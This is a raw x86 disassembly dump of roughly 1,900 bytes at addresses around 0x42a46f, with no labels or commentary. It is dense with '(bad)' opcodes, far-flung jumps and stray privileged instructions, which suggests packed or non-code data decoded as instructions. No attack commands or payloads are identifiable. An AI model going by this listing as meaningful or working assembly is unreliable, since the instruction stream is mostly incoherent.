  42a46f:	cmovne ebx,DWORD PTR [edx]
  42a472:	jecxz  0x42a474
  42a474:	inc    ebp
  42a475:	mov    esp,ecx
  42a477:	sbb    al,0x45
  42a479:	mov    ebx,edx
  42a47b:	add    DWORD PTR [ebp+0x0],eax
  42a47e:	out    dx,al
  42a47f:	add    DWORD PTR [ebp+0x4d],eax
  42a482:	and    DWORD PTR [ebx+0x2e8045],ecx
  42a488:	inc    ebp
  42a489:	mov    DWORD PTR [edx+ebp*2-0x37],edi
  42a48d:	mov    DWORD PTR [esp+edx*8-0x3c],0x33e5b6d4
  42a495:	inc    ebp
  42a496:	add    ebx,edi
  42a498:	inc    ecx
  42a499:	xlat   BYTE PTR ds:[ebx]
  42a49a:	sbb    BYTE PTR [ebp-0x758d2b07],cl
  42a4a0:	(bad)  
  42a4a1:	xor    bh,BYTE PTR [eax+eax*4+0x8bd35c6]
  42a4a8:	(bad)  
  42a4a9:	dec    esi
  42a4aa:	mov    esi,0xbf45c6f3
  42a4af:	mov    esi,eax
  42a4b1:	fadd   st,st(0)
  42a4b3:	inc    esi
  42a4b5:	(bad)  
  42a4b6:	rcl    esp,0xc6
  42a4b9:	inc    edx
  42a4bb:	push   eax
  42a4bc:	mov    BYTE PTR [ebp-0x3d],0x33
  42a4c0:	xor    eax,DWORD PTR [ebx]
  42a4c2:	lea    edx,[eax+0xd]
  42a4c5:	inc    ebp
  42a4c6:	jae    0x8c1d0ae4
  42a4cc:	ficomp WORD PTR [eax+ecx*4]
  42a4cf:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  42a4d6:	test   esi,edi
  42a4d8:	(bad)  
  42a4d9:	(bad)  
  42a4da:	inc    DWORD PTR [eax]
  42a4dc:	inc    ebp
  42a4dd:	add    BYTE PTR [ebx-0x10aa23d0],cl
  42a4e3:	mov    edx,DWORD PTR [ebx]
  42a4e5:	cld    
  42a4e6:	mov    edi,ecx
  42a4e8:	mov    ecx,ebx
  42a4ea:	pop    esp
  42a4eb:	sar    edi,0x1e
  42a4ee:	cmp    ebp,esi
  42a4f0:	jne    0x42a565
  42a4f2:	mov    DWORD PTR ds:0x22450be4,ecx
  42a4f8:	loop   0x42a4e8
  42a4fa:	pushf  
  42a4fb:	jae    0x42a488
  42a4fd:	add    eax,0x3388e91c
  42a502:	add    esi,ebp
  42a504:	add    BYTE PTR [ebx-0x40],dh
  42a507:	jmp    0x93a563
  42a50c:	mov    ebx,0x6a7275
  42a511:	pop    ecx
  42a512:	add    DWORD PTR [ebp+eax*4-0x77],esi
  42a516:	add    bh,BYTE PTR [eax+0x0]
  42a519:	dec    DWORD PTR [ebp+0x66]
  42a51c:	mov    ecx,DWORD PTR [ebp-0xff0084]
  42a522:	mov    DWORD PTR [edx-0x75],ebp
  42a525:	data16 sbb al,0x8d
  42a528:	mov    edi,edi
  42a52a:	add    edi,edi
  42a52c:	add    BYTE PTR [edx+0x1],ch
  42a52f:	data16 or BYTE PTR [ebp-0x1e00bb],cl
  42a536:	call   0xd8906ca1
  42a53b:	push   0xffffffec
  42a53d:	pop    ecx
  42a53e:	jl     0x42a4c9
  42a540:	inc    ebp
  42a541:	sbb    BYTE PTR [esi-0x37],0x8
  42a545:	test   edx,ecx
  42a547:	(bad)  
  42a548:	jmp    0x41032e4c
  42a54d:	push   ebp
  42a54e:	jne    0x42a5b6
  42a550:	lea    ecx,[ebp-0x2c]
  42a553:	mov    DWORD PTR [ebp-0x200158],0xfe4585d4
  42a55d:	into   
  42a55e:	(bad)  
  42a55f:	jmp    0x42a4ec
  42a561:	(bad)  
  42a562:	loopne 0x42a514
  42a564:	(bad)  
  42a565:	rol    ebx,cl
  42a567:	call   0xdf5eeaf7
  42a56c:	shr    cl,0x50
  42a56f:	inc    bp
  42a571:	inc    ebp
  42a572:	mov    eax,ebp
  42a574:	cwde   
  42a575:	mov    DWORD PTR [eax],0xd4ffc7d4
  42a57b:	add    bh,bh
  42a57d:	add    BYTE PTR [ecx],al
  42a57f:	call   0x141bd84
  42a584:	inc    DWORD PTR [ebp-0xb201f8]
  42a58a:	xor    eax,DWORD PTR [ebp-0xc401fd]
  42a590:	jne    0x42a51d
  42a592:	mov    eax,ds:0x33c70be0
  42a597:	ret    
  42a598:	out    dx,eax
  42a599:	mov    edx,DWORD PTR ds:0xbc0a31c
  42a59f:	push   eax
  42a5a0:	xor    eax,DWORD PTR [ebp-0x71]
  42a5a3:	mov    esi,DWORD PTR [edx-0x68]
  42a5a6:	mov    ds:0x33ff0b00,eax
  42a5ab:	(bad)  
  42a5ac:	mov    ecx,0x8b8d0008
  42a5b1:	call   FWORD PTR [edi+edi*8]
  42a5b4:	and    bh,bh
  42a5b6:	push   0x66
  42a5b8:	mov    bp,0xff8d
  42a5bc:	(bad)  
  42a5bd:	(bad)  
  42a5be:	dec    DWORD PTR [edi]
  42a5c0:	mov    DWORD PTR [edx],eax
  42a5c2:	jp     0x42a5c4
  42a5c4:	(bad)  
  42a5c5:	mov    ecx,0x774f59
  42a5ca:	mov    ecx,eax
  42a5cc:	jl     0x42a557
  42a5ce:	dec    DWORD PTR [eax-0x74c73fa7]
  42a5d4:	mov    DWORD PTR [esi+0x7e],esp
  42a5d7:	push   ebp
  42a5d8:	dec    DWORD PTR [ebp-0x7676f2a7]
  42a5de:	or     BYTE PTR [ebx+eiz*2+0x4d6666c2],0x55
  42a5e6:	xor    ecx,DWORD PTR [ebp-0x7627ec77]
  42a5ec:	call   DWORD PTR [eax+0x668dc233]
  42a5f2:	test   al,0x55
  42a5f4:	mov    DWORD PTR [ebp-0x76bade7c],ecx
  42a5fa:	int3   
  42a5fb:	xchg   esp,eax
  42a5fc:	loopne 0x42a587
  42a5fe:	(bad)  
  42a5ff:	xchg   esi,eax
  42a600:	lods   al,BYTE PTR ds:[esi]
  42a601:	ret    0x8bd3
  42a604:	in     eax,dx
  42a605:	inc    bp
  42a607:	dec    ebp
  42a608:	loop   0x42a5c3
  42a60a:	ds dec edi
  42a60c:	mov    DWORD PTR [eax],0x89eaf1b4
  42a612:	loope  0x42a678
  42a614:	(bad)  
  42a615:	(bad)  
  42a616:	mov    eax,0x85667c8b
  42a61b:	mov    ch,0xfe
  42a61d:	(bad)  
  42a61e:	(bad)  
  42a61f:	inc    DWORD PTR [eax]
  42a621:	jno    0x42a623
  42a623:	data16 mov bl,0xb5
  42a626:	add    bh,bh
  42a628:	mov    edi,edi
  42a62a:	fmul   QWORD PTR [ecx-0x729501]
  42a630:	aam    0x8d
  42a632:	call   ebx
  42a634:	push   eax
  42a635:	mov    DWORD PTR [ebp+0x6c],eax
  42a638:	xor    edi,edi
  42a63a:	add    eax,DWORD PTR [ebx-0x76bafcb0]
  42a640:	sub    DWORD PTR [esi+0x44],0xffffffff
  42a644:	mov    ecx,DWORD PTR [ebp-0x767f1ee4]
  42a64a:	add    DWORD PTR [eax+0x0],esi
  42a64d:	push   DWORD PTR [eax]
  42a64f:	push   bp
  42a651:	lea    ecx,[ebp-0x8701]
  42a657:	mov    DWORD PTR [ecx+0x74],edx
  42a65a:	sar    bh,1
  42a65c:	or     DWORD PTR [ebx-0x48000386],0x77
  42a663:	fs test edi,edi
  42a666:	add    al,0x33
  42a668:	add    BYTE PTR [ebx],al
  42a66a:	adc    dh,BYTE PTR [ebx]
  42a66c:	add    BYTE PTR [esi-0x75],ah
  42a66f:	test   DWORD PTR [esi-0x1],esp
  42a672:	inc    ebp
  42a673:	inc    DWORD PTR [ebx-0x2ff00abb]
  42a679:	dec    ebp
  42a67a:	mov    DWORD PTR [ebx],esi
  42a67c:	mov    al,BYTE PTR [ebx]
  42a67e:	push   ecx
  42a67f:	xor    esp,DWORD PTR [esi+0x66]
  42a682:	push   ebp
  42a683:	inc    ebp
  42a684:	xor    DWORD PTR [ebx],0x8
  42a687:	mov    WORD PTR [ebp-0x72],ax
  42a68b:	push   cx
  42a68d:	inc    ebp
  42a68e:	adc    WORD PTR [ebp-0x64],0xff83
  42a693:	mov    DWORD PTR [ebx],0x92b589f8
  42a699:	clc    
  42a69a:	push   ecx
  42a69b:	inc    ebp
  42a69c:	data16 cmc 
  42a69e:	push   ebp
  42a69f:	pushf  
  42a6a0:	data16 (bad) 
  42a6a2:	dec    ebp
  42a6a3:	in     al,0x83
  42a6a5:	test   DWORD PTR [edi-0x76ba3508],eax
  42a6ab:	xor    ebx,DWORD PTR [eax+0xc7329c]
  42a6b1:	in     al,0x8b
  42a6b3:	add    eax,0x45b5f866
  42a6b8:	dec    DWORD PTR [ebx+0xf094ff]
  42a6be:	mov    DWORD PTR [ecx+0x45fff466],ecx
  42a6c4:	lea    ecx,[ebx-0x4e76e3b3]
  42a6ca:	push   0x6600ff01
  42a6cf:	push   cs
  42a6d0:	test   DWORD PTR [eax+0xff01ff],eax
  42a6d6:	inc    ecx
  42a6d7:	inc    ebp
  42a6d8:	mov    WORD PTR [ebp-0x360018],ax
  42a6df:	push   cs
  42a6e0:	shl    BYTE PTR [ebp+0x66],0x8b
  42a6e4:	test   DWORD PTR [edi+edi*8],ebx
  42a6e7:	cs (bad) 
  42a6e9:	inc    DWORD PTR [ecx-0x75]
  42a6ec:	data16 in al,dx
  42a6ee:	test   DWORD PTR [eax],ecx
  42a6f0:	inc    DWORD PTR [eax]
  42a6f2:	inc    DWORD PTR [ecx-0x77]
  42a6f5:	mov    esi,DWORD PTR [edx-0x77]
  42a6f8:	call   FWORD PTR [eax]
  42a6fa:	leavew 
  42a6fc:	xchg   ebp,eax
  42a6fd:	inc    edi
  42a6fe:	push   DWORD PTR [ebp-0x1]
  42a701:	call   0xff52924b
  42a706:	lea    eax,[ebp-0x1]
  42a709:	mov    edi,edi
  42a70b:	enter  0xc7,0xc3
  42a70f:	mov    eax,ecx
  42a711:	xor    ecx,DWORD PTR [ecx-0x749bfd]
  42a717:	sbb    al,0x8b
  42a719:	sbb    esp,edi
  42a71b:	dec    ebp
  42a71c:	mov    bh,0x8b
  42a71e:	mov    ah,cl
  42a720:	mov    DWORD PTR [eax],0x8bc1ffc3
  42a726:	mov    eax,ebx
  42a728:	mov    BYTE PTR [eax],al
  42a72a:	sar    bh,0x89
  42a72d:	sub    BYTE PTR [eax-0x77ff766c],cl
  42a733:	mov    esp,DWORD PTR [ebp+0x7c]
  42a736:	add    BYTE PTR [eax],al
  42a738:	inc    ebp
  42a739:	mov    esi,DWORD PTR ds:0xc7049c8d
  42a73f:	or     ah,bl
  42a741:	add    BYTE PTR [ebp+0x458bf800],0x85
  42a748:	xor    DWORD PTR [edi],ecx
  42a74a:	pushf  
  42a74b:	js     0x42a714
  42a74d:	add    al,dh
  42a74f:	mov    eax,DWORD PTR [ebp+0x4509f8f4]
  42a755:	inc    eax
  42a756:	xor    eax,0x8b209f89
  42a75b:	call   FWORD PTR [ebx+ecx*4]
  42a75e:	cmp    al,0x1
  42a761:	mov    DWORD PTR [eax],0x8b8545c3
  42a767:	call   FWORD PTR [edi+edi*8]
  42a76a:	dec    ebp
  42a76b:	inc    ebp
  42a76c:	mov    eax,DWORD PTR [ebx-0xffe374]
  42a772:	mov    eax,DWORD PTR [eax]
  42a774:	mov    eax,edi
  42a776:	nop
  42a777:	ret    
  42a778:	add    BYTE PTR [ebp-0x130077],al
  42a77e:	jne    0x42a705
  42a780:	test   edi,edi
  42a782:	jne    0x42a783
  42a784:	dec    DWORD PTR [ebx-0x38aa1fe8]
  42a78a:	call   0xffcea452
  42a78f:	sbb    al,0x45
  42a791:	stos   BYTE PTR es:[edi],al
  42a792:	mov    eax,DWORD PTR [eax]
  42a794:	mov    edx,DWORD PTR [eax+0x3]
  42a797:	inc    ebp
  42a798:	cmp    al,0x8b
  42a79a:	push   cs
  42a79b:	cwde   
  42a79c:	inc    ebp
  42a79d:	add    BYTE PTR [ebp-0xe78b39],al
  42a7a3:	call   FWORD PTR [esp+eax*1]
  42a7a6:	test   eax,0x8bffff00
  42a7ab:	mov    DWORD PTR [esp+eiz*4],ebx
  42a7ae:	adc    BYTE PTR [ebp+0x1],0x8b
  42a7b2:	add    al,ch
  42a7b4:	add    al,dh
  42a7b6:	mov    DWORD PTR [ebp-0x3d],0x7589458b
  42a7bd:	mov    ecx,DWORD PTR [ebx-0x76cfe314]
  42a7c3:	inc    ebp
  42a7c4:	add    DWORD PTR [ebx-0x7aceb000],ecx
  42a7ca:	cmp    bh,0x1
  42a7cd:	inc    DWORD PTR [eax]
  42a7cf:	inc    ebp
  42a7d0:	push   eax
  42a7d1:	xor    ebp,ecx
  42a7d3:	add    eax,DWORD PTR [edx]
  42a7d5:	mov    DWORD PTR [eax],eax
  42a7d7:	and    al,0x80
  42a7d9:	inc    DWORD PTR [ecx]
  42a7db:	lea    eax,[eax]
  42a7dd:	pushf  
  42a7de:	or     BYTE PTR [ebp-0xfe00bb],al
  42a7e4:	jmp    0x141aa6e
  42a7e9:	dec    DWORD PTR [esi]
  42a7eb:	mov    ecx,ecx
  42a7ed:	loopne 0x42a774
  42a7ef:	mov    DWORD PTR [edx],0x4d8b00c3
  42a7f5:	sbb    al,0x8b
  42a7f7:	out    dx,al
  42a7f8:	mov    eax,DWORD PTR [eax]
  42a7fa:	push   eax
  42a7fb:	push   eax
  42a7fc:	test   DWORD PTR [ebp-0x1],eax
  42a7ff:	mov    edi,edi
  42a801:	cwde   
  42a802:	inc    ebp
  42a803:	add    BYTE PTR [ebx],dh
  42a805:	mov    DWORD PTR [ebx],0x24ff8918
  42a80b:	add    al,0xff
  42a80d:	add    BYTE PTR [ebx-0x5ae30f77],cl
  42a813:	(bad)  
  42a814:	(bad)  
  42a815:	(bad)  
  42a816:	(bad)  
  42a817:	push   DWORD PTR [ebx]
  42a819:	or     BYTE PTR [ebx],al
  42a81b:	ror    BYTE PTR [ecx-0xbad7d0],0x83
  42a822:	(bad)  
  42a823:	cld    
  42a824:	sbb    BYTE PTR [ebx+0x765050ff],al
  42a82a:	inc    ebp
  42a82b:	mov    esi,DWORD PTR [ebx]
  42a82d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a82e:	add    ecx,esi
  42a830:	push   eax
  42a831:	mov    BYTE PTR [ebp+0x4d],0x5
  42a835:	jmp    0x42a837
  42a837:	mov    eax,DWORD PTR [eax]
  42a839:	clc    
  42a83a:	mov    ecx,DWORD PTR [esp+ebx*1]
  42a83d:	inc    DWORD PTR [eax+0x5501fc]
  42a843:	mov    BYTE PTR [ebp-0xe70075],al
  42a849:	cmp    eax,DWORD PTR [eax]
  42a84b:	push   eax
  42a84c:	add    cl,ch
  42a84e:	xor    BYTE PTR [esi+0x4d],cl
  42a851:	add    edi,edi
  42a853:	mov    ecx,DWORD PTR [eax]
  42a855:	mov    al,ds:0x8b8b004d
  42a85a:	mov    ebp,DWORD PTR [ebx]
  42a85c:	hlt    
  42a85d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a85e:	add    dh,al
  42a860:	add    DWORD PTR [ebp+0x45],edx
  42a863:	mov    ecx,DWORD PTR [ecx+0x18d68b28]
  42a869:	dec    ebp
  42a86a:	inc    eax
  42a86b:	mov    DWORD PTR [ecx-0xbadf1c],ecx
  42a871:	add    BYTE PTR [ebx-0x38162400],cl
  42a877:	add    bl,al
  42a879:	add    BYTE PTR [ebp-0x2e003e],al
  42a87f:	mov    DWORD PTR [ebp-0x10],eax
  42a882:	mov    DWORD PTR [ebp+0x28],esp
  42a885:	push   eax
  42a886:	dec    DWORD PTR [ecx+0x5518e88d]
  42a88c:	dec    DWORD PTR [ecx+0x5545f050]
  42a892:	xor    ecx,DWORD PTR [edi]
  42a894:	add    edx,DWORD PTR [edx]
  42a896:	push   eax
  42a897:	xchg   ebp,eax
  42a898:	inc    ebp
  42a899:	inc    DWORD PTR ds:0xe200ff
  42a89f:	jnp    0x8097c4a5
  42a8a5:	mov    eax,DWORD PTR [ecx]
  42a8a7:	pusha  
  42a8a8:	add    bh,bh
  42a8aa:	test   ecx,eax
  42a8ac:	dec    DWORD PTR [edi+edi*8]
  42a8af:	ret    0x8d00
  42a8b2:	add    bh,bh
  42a8b4:	mov    ch,0xd7
  42a8b6:	(bad)  
  42a8b7:	cli    
  42a8b8:	inc    DWORD PTR [ebp+0x2255f830]
  42a8be:	test   DWORD PTR [ebp+0x74],ecx
  42a8c1:	add    ecx,DWORD PTR [ebx+0x65a01889]
  42a8c7:	or     BYTE PTR [eax],al
  42a8c9:	cmp    DWORD PTR [eax+0x74],edi
  42a8cc:	add    BYTE PTR [ebx+0x114dfc23],cl
  42a8d2:	sub    eax,DWORD PTR [eax]
  42a8d4:	mov    ecx,DWORD PTR [ebp-0x77]
  42a8d7:	mov    eax,edi
  42a8d9:	add    DWORD PTR [ebx],eax
  42a8db:	inc    ebp
  42a8dc:	dec    ebp
  42a8dd:	mov    ecx,DWORD PTR [edx+0x45450118]
  42a8e3:	add    cl,BYTE PTR [ebx+0x875fc4d]
  42a8e9:	mov    ecx,DWORD PTR [ebp-0xc]
  42a8ec:	inc    eax
  42a8ed:	push   ebp
  42a8ee:	push   ecx
  42a8ef:	mov    esi,DWORD PTR [edx-0x14]
  42a8f2:	mov    edx,DWORD PTR [ecx+0xce003c]
  42a8f8:	adc    DWORD PTR [eax+eax*1],0xd68b0045
  42a8ff:	add    al,0x55
  42a901:	push   ebp
  42a902:	add    ecx,DWORD PTR [ecx-0x2d030777]
  42a908:	push   ecx
  42a909:	test   DWORD PTR [ebx],eax
  42a90b:	dec    DWORD PTR [ecx+0x554518ff]
  42a911:	mov    edi,eax
  42a913:	sbb    al,0xec
  42a915:	inc    DWORD PTR [eax]
  42a917:	mov    DWORD PTR [eax],0xff8318
  42a91d:	add    al,0x83
  42a91f:	add    al,bh
  42a921:	mov    ebp,edx
  42a923:	push   eax
  42a924:	push   ebp
  42a925:	test   DWORD PTR [edi+edi*8-0x73],esi
  42a929:	dec    DWORD PTR [eax]
  42a92b:	inc    ebp
  42a92c:	push   ebp
  42a92d:	xor    ecx,DWORD PTR [ebx+0x5589f003]
  42a933:	and    al,0x8b
  42a935:	(bad)  
  42a936:	call   0x89df60c8
  42a93b:	test   DWORD PTR [eax-0x1],esp
  42a93e:	(bad)  
  42a93f:	inc    DWORD PTR [ecx+0xffff85]
  42a945:	dec    DWORD PTR [ecx-0x6a1f5f75]
  42a94b:	(bad)  
  42a94c:	inc    ebx
  42a94e:	dec    DWORD PTR [ebx-0x117ee316]
  42a954:	bound  eax,QWORD PTR [eax]
  42a956:	int    0x50
  42a958:	xor    eax,DWORD PTR [ebp-0x7f]
  42a95b:	mov    esi,DWORD PTR [edx]
  42a95d:	cwde   
  42a95e:	pushf  
  42a95f:	add    BYTE PTR [ebp-0x1],dh
  42a962:	mov    edi,edi
  42a964:	mov    al,ds:0x4d45ce08
  42a969:	inc    DWORD PTR [ebx]
  42a96b:	adc    al,0x83
  42a96d:	add    BYTE PTR [eax],0x1
  42a970:	adc    BYTE PTR [eax],al
  42a972:	push   ebp
  42a973:	inc    ebp
  42a974:	add    edi,edi
  42a976:	mov    edx,DWORD PTR [eax]
  42a978:	mov    ecx,DWORD PTR [ebp-0x60]
  42a97b:	push   esi
  42a97c:	adc    al,0x8
  42a97e:	mov    edx,DWORD PTR [ebp-0x8]
  42a981:	mov    ecx,DWORD PTR [ebp-0x4]
  42a984:	add    DWORD PTR [ebp-0x18],0xffffff8d
  42a988:	inc    DWORD PTR [eax+esi*8]
  42a98b:	inc    ebp
  42a98c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a98d:	mov    edx,DWORD PTR [ebp+0x1c]
  42a990:	add    DWORD PTR [ebp-0x14],eax
  42a993:	mov    edx,DWORD PTR [ebp-0x70]
  42a996:	cmp    eax,DWORD PTR [eax]
  42a998:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a999:	mov    eax,DWORD PTR [eax]
  42a99b:	sbb    al,0x73
  42a99d:	add    BYTE PTR [ebx],0x1
  42a9a0:	hlt    
  42a9a1:	add    BYTE PTR [eax+0x30],dl
  42a9a4:	mov    DWORD PTR [ecx],esi
  42a9a6:	hlt    
  42a9a7:	pop    ds
  42a9a8:	inc    ebp
  42a9a9:	xor    al,BYTE PTR [ebp+0x6c760f3a]
  42a9af:	(bad)  
  42a9b0:	push   DWORD PTR [edi]
  42a9b2:	mov    ecx,DWORD PTR [ebx+0x398503a4]
  42a9b8:	push   DWORD PTR [ebx-0x1]
  42a9bb:	mov    eax,DWORD PTR [ebp-0x740075]
  42a9c1:	sub    eax,DWORD PTR [eax]
  42a9c3:	add    eax,DWORD PTR [eax]
  42a9c5:	mov    DWORD PTR [ecx+0x5f],eax
  42a9c8:	mov    DWORD PTR [ebx+0x20],ebx
  42a9cb:	ret    0xff
  42a9ce:	mov    ecx,DWORD PTR [ebx+0x1cc783dc]
  42a9d4:	ret    
  42a9d5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  42a9db:	add    BYTE PTR [ebp-0x7d],al
  42a9de:	mov    DWORD PTR [eax],eax
  42a9e0:	sub    BYTE PTR [edi+edi*8+0x18008d01],al
  42a9e7:	sar    bh,cl
  42a9e9:	test   BYTE PTR [eax+0x1],dl
  42a9ec:	inc    ebp
  42a9ed:	add    BYTE PTR [ebx],dh
  42a9ef:	test   BYTE PTR [ebx],0x84
  42a9f2:	push   eax
  42a9f3:	add    BYTE PTR [ebp+0x0],al
  42a9f6:	add    eax,0x86
  42a9fb:	add    BYTE PTR [ebx-0x7f7be340],cl
  42aa01:	add    BYTE PTR [ecx],al
  42aa03:	add    BYTE PTR [eax],al
  42aa05:	mov    esi,0x550030
  42aa0a:	mov    ecx,DWORD PTR [edi]
  42aa0c:	sbb    al,0xda
  42aa0e:	jne    0x42aa10
  42aa10:	mov    edi,DWORD PTR [ecx]
  42aa12:	xor    BYTE PTR [eax+eax*1],0x84
  42aa16:	add    eax,DWORD PTR [eax]
  42aa18:	cld    
  42aa19:	add    BYTE PTR [ebp-0x4f],dh
  42aa1c:	mov    eax,DWORD PTR [ecx]
  42aa1e:	cld    
  42aa1f:	add    BYTE PTR [ecx-0x1bff009b],cl
  42aa25:	retf   0xe45
  42aa28:	add    eax,edx
  42aa2a:	sbb    al,0xb7
  42aa2c:	dec    ebp
  42aa2d:	or     al,0x89
  42aa2f:	dec    ebp
  42aa30:	sbb    al,0xf
  42aa32:	inc    ebp
  42aa33:	dec    eax
  42aa34:	mov    eax,DWORD PTR [ebx]
  42aa36:	sbb    al,0xf
  42aa38:	nop
  42aa39:	scas   al,BYTE PTR es:[edi]
  42aa3a:	add    DWORD PTR [eax],eax
  42aa3c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  42aa42:	mov    eax,gs
  42aa44:	add    bh,bh
  42aa46:	mov    edi,edi
  42aa48:	cmp    DWORD PTR [edi+0x72],edx
  42aa4b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  42aa51:	gs cmp al,0x0
  42aa54:	je     0x42aa2c
  42aa56:	push   eax
  42aa57:	sar    BYTE PTR [eax],1
  42aa59:	mov    bh,0x3e
  42aa5b:	push   cs
  42aa5c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  42aa62:	add    DWORD PTR [ecx+0x12],ebp
  42aa65:	dec    edx
  42aa66:	(bad)  
  42aa67:	mov    eax,edx
  42aa69:	in     al,dx
  42aa6a:	adc    DWORD PTR [ecx],esi
  42aa6c:	pop    esi
  42aa6d:	inc    ecx
  42aa6e:	leave  
  42aa6f:	or     DWORD PTR [eax],ebx
  42aa71:	gs push ebp
  42aa73:	add    ah,ch
  42aa75:	into   
  42aa76:	in     al,dx
  42aa77:	enter  0xb756,0xf0
  42aa7b:	push   cs
  42aa7c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  42aa86:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  42aa8c:	jnp    0x74432f94
  42aa92:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  42aa98:	add    BYTE PTR [edi],cl
  42aa9a:	mov    edi,DWORD PTR [ecx-0x78]
  42aa9d:	ltr    WORD PTR [ecx-0x7b]
  42aaa1:	dec    DWORD PTR [edi]
  42aaa3:	clc    
  42aaa4:	out    0x45,eax
  42aaa6:	add    BYTE PTR [eax],cl
  42aaa8:	cmp    ebx,0xffffff8c
  42aaab:	jge    0x42aaad
  42aaad:	jb     0x42aabf
  42aaaf:	je     0x51ab2f
  42aab5:	pop    edx
  42aab6:	push   esi
  42aab7:	mov    ecx,DWORD PTR [edi]
  42aab9:	in     al,dx
  42aaba:	rol    DWORD PTR [ebp+0x0],1
  42aabd:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  42aac4:	cmp    DWORD PTR [ecx],0xfffffff0
  42aac7:	hlt    
  42aac8:	mov    esp,DWORD PTR [eax+0xf034d2b]
  42aace:	(bad)  
  42aad0:	push   eax
  42aad1:	jns    0xb8428f4f
  42aad7:	lock push cs
  42aad9:	ror    edx,0x3
  42aadc:	test   BYTE PTR [ecx+0x5500e800],cl
  42aae2:	dec    eax
  42aae3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  42aae7:	(bad)  
  42aae8:	mov    esi,0x7f33ff5f
  42aaed:	inc    eax
  42aaee:	test   DWORD PTR [edx],eax
  42aaf0:	je     0x42aab2
  42aaf2:	mov    ecx,ecx
  42aaf4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  42aaf8:	and    eax,DWORD PTR [eax+0xf0103]
  42aafe:	jp     0x42aaec
  42ab00:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  42ab04:	add    edx,DWORD PTR [edi+0x74]
  42ab07:	sbb    BYTE PTR [ebp+0x4d001484],cl
  42ab0d:	add    BYTE PTR [ebp-0x74c48bbb],al
  42ab13:	je     0x42aa98
  42ab15:	cmp    eax,edi
  42ab17:	js     0x42ab3c
  42ab19:	add    eax,0xeb0fc003
  42ab1e:	jns    0x42aaab
  42ab20:	vmread DWORD PTR [ecx+0x45],ebx
  42ab24:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  42ab2a:	adc    al,0x8b
  42ab2c:	jge    0x42ab42
  42ab2e:	mov    edi,DWORD PTR [eax-0x4]
  42ab31:	add    edi,DWORD PTR [edi]
  42ab33:	or     bh,bh
  42ab35:	push   ebp
  42ab36:	push   es
  42ab37:	mov    DWORD PTR [ebp-0x4],ebx
  42ab3a:	add    edi,esi
  42ab3c:	pop    es
  42ab3d:	add    esi,DWORD PTR [edi-0x48ccf183]
  42ab43:	mov    DWORD PTR [esp+esi*8],ecx
  42ab46:	inc    ebp
  42ab47:	pop    ebp
  42ab48:	xor    DWORD PTR [esi-0x4],0x3b
  42ab4c:	add    edx,DWORD PTR [ecx+edi*1]
  42ab4f:	push   es
  42ab50:	clc    
  42ab51:	mov    bh,0xdb
  42ab53:	jp     0x42ab0c
  42ab55:	add    cl,BYTE PTR [esi]
  42ab57:	div    DWORD PTR [edi+0x4d8b0c1c]
  42ab5d:	test   edi,edi
  42ab5f:	je     0x42ab55
  42ab61:	mov    eax,ecx
  42ab63:	or     BYTE PTR [ebx],al
  42ab65:	dec    BYTE PTR [ecx+0x7d3bec7d]
  42ab6b:	jbe    0x42abdf
  42ab6d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  42ab73:	add    ecx,DWORD PTR [esi]
  42ab75:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  42ab7b:	add    eax,DWORD PTR [ebx-0x287af783]
  42ab81:	je     0x42abd0
  42ab83:	mov    DWORD PTR [ecx],edi
  42ab85:	mov    esi,eax
  42ab87:	hlt    
  42ab88:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  42ab8f:	jb     0x42ab51
  42ab91:	jmp    0x42ab7e
  42ab93:	xor    esi,DWORD PTR [ebx]
  42ab95:	pop    edi
  42ab96:	pop    esi
  42ab97:	pop    ebx
  42ab98:	ret    
  42ab99:	ret    0x8b
  42ab9c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  42aba2:	xor    DWORD PTR ds:0x89339c0c,0x56
  42aba9:	cld    
  42abaa:	cmp    DWORD PTR [ebp+0xf],eax
  42abad:	xor    al,0x85
  42abaf:	pushf  
  42abb0:	add    BYTE PTR [ebx+0x4d0cfc8b],cl
  42abb6:	ret    
  42abb7:	mov    edi,DWORD PTR [esi-0x4]
  42abba:	pop    eax
  42abbb:	dec    ebp
  42abbc:	jne    0x42ab49
  42abbe:	xor    edi,esp
  42abc0:	inc    eax
  42abc1:	dec    ebp
  42abc2:	jbe    0x42ac17
  42abc4:	inc    eax
  42abc5:	pop    ebp
  42abc6:	add    edx,DWORD PTR [esi+0x8]
  42abc9:	push   edi
  42abca:	dec    eax
  42abcb:	push   ecx
  42abcc:	mov    eax,edi
  42abce:	and    al,0xf0
  42abd0:	jo     0x42abbd
  42abd2:	mov    eax,DWORD PTR [ebx]
  42abd4:	sbb    BYTE PTR [ebp+0x4d],cl
  42abd7:	mov    eax,DWORD PTR [ebx]
  42abd9:	nop
  42abda:	or     BYTE PTR [eax],al
  42abdc:	jne    0x42ac35
  42abde:	cmp    ebx,DWORD PTR [esi+0x33893277]
  42abe4:	cld    
  42abe5:	xor    edi,edi
  42abe7:	add    edi,DWORD PTR [ebp+0x3]
  42abea:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  42abf0:	js     0x42ab76
  42abf2:	jae    0x42abf6
  42abf4:	(bad)  
  42abf6:	xor    al,0x5d
  42abf8:	jmp    0x42ab85
  42abfa:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  42ac01:	fdecstp 
  42ac03:	test   BYTE PTR [edi],ah
  42ac05:	add    bh,BYTE PTR [ebp+0x0]
  42ac08:	add    ebx,DWORD PTR [ebp-0x77]
  42ac0b:	mov    edi,eax
